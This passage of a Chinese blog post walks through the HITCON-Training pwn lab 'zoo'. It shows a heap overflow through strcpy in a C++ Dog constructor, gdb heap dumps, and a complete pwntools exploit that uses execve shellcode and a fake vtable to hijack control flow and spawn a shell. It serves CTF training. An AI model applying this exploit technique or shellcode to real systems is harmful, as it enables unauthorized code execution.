class=\"number\">0x20</span>) + p64(<span class=\"number\">0x91</span>) + <span class=\"string\">\"aaaaaaaa\"</span> + p64(addr)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab15——zoo\"><a href=\"#Lab15——zoo\" class=\"headerlink\" title=\"Lab15——zoo\"></a>Lab15——zoo</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题没有开启NX和PIE，只有canary。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab15$ checksec zoo</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab15/zoo&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是C++编写的。首先会读入0x64bytes到全局变量nameofzoo。</p>\n<h4 id=\"adddog\"><a href=\"#adddog\" class=\"headerlink\" title=\"adddog\"></a>adddog</h4><p>要求输入name和weight，然后new一个0x28的dog对象，调用构造函数初始化，然后向animallist这个vector中插入当前dog对象。</p>\n<p>逆向可得Dog类的结构如下：有两个成员函数和两个成员变量，存储name和weight。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Dog</span> :</span> Animal&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">speak</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">info</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[<span class=\"number\">24</span>];<span class=\"comment\">// + 8</span></span><br><span class=\"line\">\t<span class=\"keyword\">long</span> weight; <span class=\"comment\">// + 32</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中成员函数指向rodata段的vtable。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.rodata:0000000000403130 `vtable for&apos;Dog dq 0                    ; offset to this</span><br><span class=\"line\">.rodata:0000000000403138                 dq offset `typeinfo for&apos;Dog</span><br><span class=\"line\">.rodata:0000000000403140 off_403140      dq offset Dog::speak(void)</span><br><span class=\"line\">.rodata:0000000000403140                                         ; DATA XREF: Dog::Dog(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+1F↑o</span><br><span class=\"line\">.rodata:0000000000403148                 dq offset Dog::info(void)</span><br><span class=\"line\">.rodata:0000000000403150                 public `vtable for&apos;Animal ; weak</span><br></pre></td></tr></table></figure>\n<p>Dog的构造函数中存在堆溢出漏洞，由于直接使用strcpy。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">adddog</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 dog; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> weight; <span class=\"comment\">// [rsp+Ch] [rbp-74h]</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+10h] [rbp-70h]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v5; <span class=\"comment\">// [rsp+20h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> name; <span class=\"comment\">// [rsp+40h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+68h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Name : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&gt;&gt;&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;edata, &amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Weight : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::istream::<span class=\"keyword\">operator</span>&gt;&gt;(&amp;edata, &amp;weight);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;name, &amp;v5);</span><br><span class=\"line\">  dog = <span class=\"keyword\">operator</span> <span class=\"keyword\">new</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  Dog::Dog(dog, (__int64)&amp;name, weight);</span><br><span class=\"line\">  v4 = dog;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;name);</span><br><span class=\"line\">  v3 = v4;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;Animal *,<span class=\"built_in\">std</span>::allocator&lt;Animal *&gt;&gt;::push_back(&amp;animallist, &amp;v3);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v7;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"addcat\"><a href=\"#addcat\" class=\"headerlink\" title=\"addcat\"></a>addcat</h4><p>和adddog完全一样，只不过new的是cat对象，同样push_back到animallist中。</p>\n<h4 id=\"listen\"><a href=\"#listen\" class=\"headerlink\" title=\"listen\"></a>listen</h4><p>首先检查animallist的size是否为0，是则直接退出。然后若index合法，则直接调用相应animal的speak函数。这里不难想到，如果我们可以劫持vtable，也就可以劫持控制流了。</p>\n<h4 id=\"show-1\"><a href=\"#show-1\" class=\"headerlink\" title=\"show\"></a>show</h4><p>同上，也是调用对象的成员函数。打印出对象的name和info字段。</p>\n<h4 id=\"remove\"><a href=\"#remove\" class=\"headerlink\" title=\"remove\"></a>remove</h4><p>首先delete掉animallist上对应index的对象，然后erase掉vector上相应项。</p>\n<h3 id=\"利用-4\"><a href=\"#利用-4\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>这里主要的难点是获取覆盖虚表指针的偏移，可以用gdb调试获得。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x0000000001263c20</span><br><span class=\"line\">0x1263c20:\t0x0000000000403140\t0x0000000031676f64</span><br><span class=\"line\">0x1263c30:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c40:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263c50:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c60:\t0x0000000000000000\t0x0000000000000031</span><br><span class=\"line\">0x1263c70:\t0x0000000000403140\t0x0000000032676f64</span><br><span class=\"line\">0x1263c80:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c90:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263ca0:\t0x0000000001263c20\t0x0000000001263c70</span><br><span class=\"line\">0x1263cb0:\t0x0000000000000000\t0x0000000000020351</span><br><span class=\"line\">0x1263cc0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cd0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263ce0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cf0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d00:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d10:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到0x1263c70处是要覆盖的虚表地址，而我们是从0x1263c28处开始写，所以需要padding 9 * 0x8 bytes。</p>\n<p>直接在读入zooname时在bss段布置好shellcode和fake vtable，最后直接覆盖vtable即可。</p>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">adddog</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addcat</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">listen</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name of Your zoo :\"</span>, shellcode + p64(<span class=\"number\">0x605420</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">adddog(<span class=\"string\">\"dog1\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"dog2\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">remove(<span class=\"number\">0</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x8</span> * <span class=\"number\">9</span> + p64(<span class=\"number\">0x605420</span> + len(shellcode)),<span class=\"number\">40</span>)</span><br><span class=\"line\">listen(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]}